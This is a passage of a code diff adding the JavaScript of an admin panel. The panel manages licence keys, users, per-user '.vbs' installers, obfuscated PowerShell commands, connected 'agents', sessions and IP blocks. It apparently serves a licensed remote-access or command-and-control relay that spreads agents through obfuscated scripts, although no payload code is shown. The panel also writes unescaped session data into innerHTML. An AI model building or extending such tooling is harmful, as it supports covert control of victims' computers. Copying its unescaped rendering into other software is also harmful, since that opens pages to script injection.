+                '<div>' + usedInfo + '</div>' +
+                '<div>' + noteText + '</div>' +
+                actions + '</div>';
+        }).join('');
+    }
+
+    function showGenerateLicenses() {
+        document.getElementById('licCount').value = '1';
+        document.getElementById('licNote').value = '';
+        document.getElementById('licExpiry').value = '0';
+        document.getElementById('generateLicModal').classList.add('show');
+        setTimeout(() => document.getElementById('licCount').focus(), 100);
+    }
+    function hideGenerateLicenses() { document.getElementById('generateLicModal').classList.remove('show'); }
+
+    async function generateLicenses() {
+        const count = parseInt(document.getElementById('licCount').value) || 1;
+        const note = document.getElementById('licNote').value.trim();
+        const expiryDays = parseInt(document.getElementById('licExpiry').value) || 0;
+        try {
+            const res = await fetch(API + '/admin/licenses/generate', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ count, note, expiryDays }) });
+            const data = await res.json();
+            if (res.ok) { hideGenerateLicenses(); showMsg('✅ Generated ' + data.licenses.length + ' key(s)', true); fetchLicenses(); }
+            else { showMsg(data.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    async function revokeLicense(id) {
+        if (!confirm('Revoke this license? The user will lose access immediately.')) return;
+        try {
+            const res = await fetch(API + '/admin/licenses/revoke', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ id }) });
+            if (res.ok) { showMsg('License revoked', true); fetchLicenses(); }
+            else { const d = await res.json(); showMsg(d.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    async function deleteLicense(id) {
+        if (!confirm('Delete this license key permanently?')) return;
+        try {
+            const res = await fetch(API + '/admin/licenses/' + id, { method: 'DELETE', headers: { 'x-admin-token': adminToken } });
+            if (res.ok) { showMsg('License deleted', true); fetchLicenses(); }
+            else { showMsg('Failed to delete', false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    // USER FUNCTIONS
+    function showFnameEdit(id) { document.getElementById('fname-row-' + id).classList.add('show'); document.getElementById('fname-val-' + id).focus(); }
+    function hideFnameEdit(id) { document.getElementById('fname-row-' + id).classList.remove('show'); }
+
+    async function saveFileName(id) {
+        const val = document.getElementById('fname-val-' + id).value.trim();
+        if (!val) { showMsg('File name cannot be empty', false); return; }
+        try {
+            const res = await fetch(API + '/admin/users/' + id + '/change-filename', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ fileName: val }) });
+            const data = await res.json();
+            if (res.ok) { document.getElementById('fname-disp-' + id).textContent = data.fileName + '.vbs'; hideFnameEdit(id); showMsg('File name updated', true); }
+            else { showMsg(data.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    function copyText(text, btn) {
+        navigator.clipboard.writeText(text).then(() => {
+            const orig = btn.textContent; btn.textContent = '✅ Copied!'; btn.style.borderColor = '#4cff91'; btn.style.color = '#4cff91';
+            setTimeout(() => { btn.textContent = orig; btn.style.borderColor = ''; btn.style.color = ''; }, 2000);
+        }).catch(() => showMsg('Could not copy', false));
+    }
+
+    function copyPS(id, type, btn) {
+        const cmd = type === 'obf' ? psObfStore[id] : psStore[id];
+        if (!cmd) { showMsg('PS command not available', false); return; }
+        navigator.clipboard.writeText(cmd).then(() => {
+            const orig = btn.textContent; btn.textContent = '✅ Copied!'; btn.style.borderColor = '#4cff91'; btn.style.color = '#4cff91';
+            setTimeout(() => { btn.textContent = orig; btn.style.borderColor = ''; btn.style.color = ''; }, 2000);
+        }).catch(() => showMsg('Could not copy', false));
+    }
+
+    function showCreateUser() { document.getElementById('newUserName').value = ''; document.getElementById('newUserPass').value = ''; document.getElementById('newUserFileName').value = ''; document.getElementById('createUserModal').classList.add('show'); setTimeout(() => document.getElementById('newUserName').focus(), 100); }
+    function hideCreateUser() { document.getElementById('createUserModal').classList.remove('show'); }
+
+    async function createUser() {
+        const name = document.getElementById('newUserName').value.trim();
+        const passphrase = document.getElementById('newUserPass').value.trim();
+        const fileName = document.getElementById('newUserFileName').value.trim();
+        if (!name) { showMsg('Name required', false); return; }
+        if (passphrase.length < 6) { showMsg('Passphrase too short (min 6 chars)', false); return; }
+        try {
+            const res = await fetch(API + '/admin/users/create', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ name, passphrase, fileName: fileName || undefined }) });
+            const data = await res.json();
+            if (res.ok) { hideCreateUser(); showMsg('User "' + name + '" created — ID: ' + data.user.displayId, true); fetchUsers(); }
+            else { showMsg(data.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    async function deleteUser(id, name) {
+        if (!confirm('Delete user "' + name + '"?\n\nThis disconnects all their agents.')) return;
+        try {
+            const res = await fetch(API + '/admin/users/' + id, { method: 'DELETE', headers: { 'x-admin-token': adminToken } });
+            if (res.ok) { showMsg('User "' + name + '" deleted', true); fetchUsers(); }
+            else { const d = await res.json(); showMsg(d.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    function showChangePass(id, name) { document.getElementById('changePassUserId').value = id; document.getElementById('changePassUserName').textContent = 'Changing passphrase for: ' + name; document.getElementById('changePassValue').value = ''; document.getElementById('changePassModal').classList.add('show'); setTimeout(() => document.getElementById('changePassValue').focus(), 100); }
+    function hideChangePass() { document.getElementById('changePassModal').classList.remove('show'); }
+
+    async function doChangePassphrase() {
+        const id = document.getElementById('changePassUserId').value;
+        const passphrase = document.getElementById('changePassValue').value.trim();
+        if (passphrase.length < 6) { showMsg('Passphrase too short', false); return; }
+        try {
+            const res = await fetch(API + '/admin/users/' + id + '/change-passphrase', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ passphrase }) });
+            const data = await res.json();
+            if (res.ok) { hideChangePass(); showMsg('Passphrase updated', true); fetchUsers(); }
+            else { showMsg(data.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    async function downloadInstaller(id, fileName, ext) {
+        try {
+            const url = API + '/admin/users/' + id + '/installer' + (ext === 'txt' ? '?format=txt' : '');
+            const res = await fetch(url, { headers: { 'x-admin-token': adminToken } });
+            if (!res.ok) { showMsg('Failed to get installer', false); return; }
+            const text = await res.text();
+            const blob = new Blob([text], { type: 'text/plain' });
+            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = fileName + '.' + ext; a.click();
+            URL.revokeObjectURL(a.href);
+            showMsg(fileName + '.' + ext + ' downloaded', true);
+        } catch { showMsg('Failed to download', false); }
+    }
+
+    // SESSIONS
+    async function fetchSessions() {
+        try {
+            const res = await fetch(API + '/admin/sessions', { headers: { 'x-admin-token': adminToken } });
+            const data = await res.json();
+            renderSessions(data.sessions || [], data.history || []);
+        } catch {}
+    }
+
+    function renderSessions(sessions, history) {
+        document.getElementById('statLive').textContent = sessions.length;
+        document.getElementById('liveCount').textContent = sessions.length + ' active';
+        document.getElementById('historyCount').textContent = history.length + ' sessions';
+        const st = document.getElementById('sessionsTable');
+        if (!sessions.length) { st.innerHTML = '<div class="empty">No active sessions</div>'; }
+        else { st.innerHTML = sessions.map(s => { const loc = s.location ? s.location.city + ', ' + s.location.country : ''; return '<div class="session-row"><div><div class="ip-text">' + s.ip + '</div><div class="loc-text">📍 ' + loc + '</div></div><div class="time-text">' + new Date(s.loginTime).toLocaleString() + '</div><span style="color:#555;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + (s.userAgent || '').substring(0, 50) + '</span><span style="color:#ffaa00">' + formatDuration(s.duration || 0) + '</span><div style="display:flex;gap:6px"><button class="btn-danger" onclick="kickSession(\'' + s.socketId + '\')">Kick</button><button class="btn-warn" onclick="blockAndKick(\'' + s.ip + '\',\'' + s.socketId + '\')">Block</button></div></div>'; }).join(''); }
+        const ht = document.getElementById('historyTable');
+        if (!history.length) { ht.innerHTML = '<div class="empty">No history yet</div>'; }
+        else { ht.innerHTML = [...history].reverse().map(s => { const loc = s.location ? s.location.city + ', ' + s.location.country : ''; return '<div class="history-row"><div><div class="ip-text">' + s.ip + '</div><div class="loc-text">📍 ' + loc + '</div></div><span class="time-text">' + new Date(s.loginTime).toLocaleString() + '</span><span class="time-text">' + (s.logoutTime ? new Date(s.logoutTime).toLocaleString() : '—') + '</span><span style="color:#ffaa00">' + formatDuration(s.duration || 0) + '</span><button class="btn-warn" style="justify-self:start" onclick="blockIpDirect(\'' + s.ip + '\')">Block IP</button></div>'; }).join(''); }
+    }
+
+    // LOGS
+    async function fetchLogs() {
+        try {
+            const res = await fetch(API + '/admin/logs', { headers: { 'x-admin-token': adminToken } });
+            const data = await res.json();
+            renderLogs(data.logs || []);
+        } catch {}
+    }
+
+    function renderLogs(logs) {
+        document.getElementById('logsCount').textContent = logs.length + ' entries';
+        document.getElementById('statTotal').textContent = logs.length;
+        document.getElementById('statSuccess').textContent = logs.filter(l => l.action === 'login:success').length;
+        document.getElementById('statFailed').textContent = logs.filter(l => l.action === 'login:failed').length;
+        document.getElementById('statUnique').textContent = new Set(logs.map(l => l.ip)).size;
+        const table = document.getElementById('logsTable');
+        if (!logs.length) { table.innerHTML = '<div class="empty">No logs yet</div>'; return; }
+        table.innerHTML = [...logs].reverse().map(log => { const cls = log.action === 'login:success' ? 'success' : log.action === 'login:failed' ? 'failed' : ''; const ac = log.action === 'login:success' ? '#4cff91' : log.action === 'login:failed' ? '#ff4444' : '#555'; return '<div class="log-row ' + cls + '"><span class="time-text">' + new Date(log.timestamp).toLocaleString() + '</span><div><div class="ip-text">' + log.ip + '</div><div class="loc-text">📍 ' + (log.location ? log.location.city + ', ' + log.location.country : '') + '</div></div><span style="color:' + ac + '">' + log.action + '</span><span style="color:#333;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + (log.userAgent || '').substring(0, 60) + '</span></div>'; }).join('');
+    }
+
+    // SECURITY
+    async function fetchBlockedIPs() {
+        try {
+            const res = await fetch(API + '/admin/blocked-ips', { headers: { 'x-admin-token': adminToken } });
+            const data = await res.json();
+            renderBlockedIPs(data.blocked || []);
+        } catch {}
+    }
+
+    function renderBlockedIPs(blocked) {
+        const table = document.getElementById('blockedTable');
+        if (!blocked.length) { table.innerHTML = '<div class="empty">No blocked IPs</div>'; return; }
+        table.innerHTML = blocked.map(ip => '<div class="blocked-row"><span class="ip-text">' + ip + '</span><button class="btn-secondary" onclick="unblockIp(\'' + ip + '\')">Unblock</button></div>').join('');
+    }
+
+    async function blockIp() { const ip = document.getElementById('blockIpInput').value.trim(); if (!ip) return; await blockIpDirect(ip); document.getElementById('blockIpInput').value = ''; }
+    async function blockIpDirect(ip) { try { await fetch(API + '/admin/block-ip', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ ip }) }); showMsg('IP ' + ip + ' blocked', true); fetchBlockedIPs(); } catch { showMsg('Failed', false); } }
+    async function unblockIp(ip) { try { await fetch(API + '/admin/unblock-ip', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ ip }) }); showMsg('IP ' + ip + ' unblocked', true); fetchBlockedIPs(); } catch { showMsg('Failed', false); } }
+    async function kickSession(socketId) { if (!confirm('Kick this session?')) return; try { await fetch(API + '/admin/kick', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ socketId }) }); showMsg('Session kicked', true); setTimeout(fetchSessions, 1000); } catch { showMsg('Failed', false); } }
+    async function blockAndKick(ip, socketId) { if (!confirm('Block IP ' + ip + ' and kick?')) return; await blockIpDirect(ip); await kickSession(socketId); }
+
+    async function changeAdminPassword() {
+        const oldPass = document.getElementById('oldAdminPass').value;
+        const newPass = document.getElementById('newAdminPass').value;
+        try {
+            const res = await fetch(API + '/admin/change-admin-password', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-token': adminToken }, body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass }) });
+            const data = await res.json();
+            if (res.ok) { adminToken = newPass; showMsg('Admin password updated', true); document.getElementById('oldAdminPass').value = ''; document.getElementById('newAdminPass').value = ''; }
+            else { showMsg(data.error, false); }
+        } catch { showMsg('Connection failed', false); }
+    }
+
+    async function clearLogs() { if (!confirm('Clear all logs?')) return; try { await fetch(API + '/admin/clear-logs', { method: 'POST', headers: { 'x-admin-token': adminToken } }); renderLogs([]); showMsg('Logs cleared', true); } catch { showMsg('Failed', false); } }
+    async function restartRelay() { if (!confirm('Restart relay? All sessions will disconnect.')) return; try { await fetch(API + '/admin/restart', { method: 'POST', headers: { 'x-admin-token': adminToken } }); } catch {} showMsg('Relay restarting...', true); }
+    function formatDuration(s) { if (s < 60) return s + 's'; if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's'; return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm'; }
+    function showMsg(text, success) { const bar = document.getElementById('msgBar'); bar.textContent = text; bar.className = 'msg-bar show ' + (success ? 'success-bar' : 'error-bar'); setTimeout(() => bar.className = 'msg-bar', 4000); }
+    function logout() { adminToken = ''; clearInterval(refreshInterval); document.getElementById('adminWrap').style.display = 'none'; document.getElementById('loginWrap').style.display = 'flex'; document.getElementById('adminPass').value = ''; }
+    </script>
+</body>
+</html>
